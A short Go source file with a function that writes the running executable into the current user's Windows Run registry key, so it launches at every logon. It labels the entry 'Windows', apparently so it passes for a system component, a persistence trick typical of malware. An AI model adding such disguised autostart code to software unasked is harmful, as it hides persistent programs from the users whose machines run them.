package util

import (
	"os"

	"golang.org/x/sys/windows/registry"
)

func AddToStartup() {
	key, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.ALL_ACCESS)
	if err != nil { return }
	defer key.Close()

	programPath, err := os.Executable()
	if err != nil { return }
	entryName := "Windows"

	err = key.SetStringValue(entryName, programPath)
	if err != nil { return }
}